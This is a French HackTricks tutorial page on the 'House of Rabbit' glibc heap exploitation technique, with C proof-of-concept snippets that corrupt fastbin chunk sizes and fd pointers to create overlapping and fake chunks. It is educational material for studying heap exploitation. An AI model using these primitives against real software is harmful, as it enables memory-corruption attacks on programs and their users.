# Maison du Lapin

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

### Exigences

1. **Capacit√© √† modifier le pointeur fd ou la taille du fastbin** : Cela signifie que vous pouvez changer le pointeur avant d'un chunk dans le fastbin ou sa taille.
2. **Capacit√© √† d√©clencher `malloc_consolidate`** : Cela peut √™tre fait en allouant un gros chunk ou en fusionnant le chunk sup√©rieur, ce qui force le tas √† consolider les chunks.

### Objectifs

1. **Cr√©er des chunks superpos√©s** : Avoir un chunk qui se superpose √† un autre, permettant ainsi d'autres manipulations du tas.
2. **Forger des faux chunks** : Tromper l'allocateur pour qu'il traite un faux chunk comme un chunk l√©gitime lors des op√©rations sur le tas.

## √âtapes de l'attaque

### POC 1 : Modifier la taille d'un chunk fastbin

**Objectif** : Cr√©er un chunk superpos√© en manipulant la taille d'un chunk fastbin.

* **√âtape 1 : Allouer des chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **√âtape 2 : Lib√©rer les morceaux**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Nous lib√©rons les deux morceaux, en les ajoutant √† la liste fastbin.

* **√âtape 3: Modifier la taille du morceau**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **√âtape 4 : D√©clencher `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allouer un gros morceau d√©clenche la fonction `malloc_consolidate`, fusionnant les petits morceaux dans le fast bin. La taille manipul√©e de `chunk1` provoque un chevauchement avec `chunk2`.

Apr√®s la consolidation, `chunk1` chevauche `chunk2`, permettant une exploitation suppl√©mentaire.

### POC 2: Modifier le pointeur `fd`

**Objectif**: Cr√©er un faux morceau en manipulant le pointeur `fd` du fast bin.

* **√âtape 1: Allouer des morceaux**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explication** : Nous allouons deux morceaux, un plus petit et un plus grand, pour configurer le tas pour le faux morceau.

* **√âtape 2 : Cr√©er un faux morceau**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **√âtape 3 : Lib√©rer `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explication**: Nous lib√©rons `chunk1`, en l'ajoutant √† la liste fastbin.

* **√âtape 4: Modifier `fd` de `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explication** : Nous changeons le pointeur avant (`fd`) de `chunk1` pour pointer vers notre faux chunk √† l'int√©rieur de `chunk2`.

* **√âtape 5 : D√©clencher `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allouer √† nouveau un gros morceau d√©clenche `malloc_consolidate`, qui traite le faux morceau.

Le faux morceau devient partie de la liste fastbin, en faisant un morceau l√©gitime pour une exploitation ult√©rieure.

### R√©sum√©

La technique de la **Maison du Lapin** implique soit de modifier la taille d'un morceau de fast bin pour cr√©er des chevauchements de morceaux, soit de manipuler le pointeur `fd` pour cr√©er des faux morceaux. Cela permet aux attaquants de forger des morceaux l√©gitimes dans le tas, permettant diverses formes d'exploitation. Comprendre et pratiquer ces √©tapes am√©liorera vos comp√©tences en exploitation de tas.
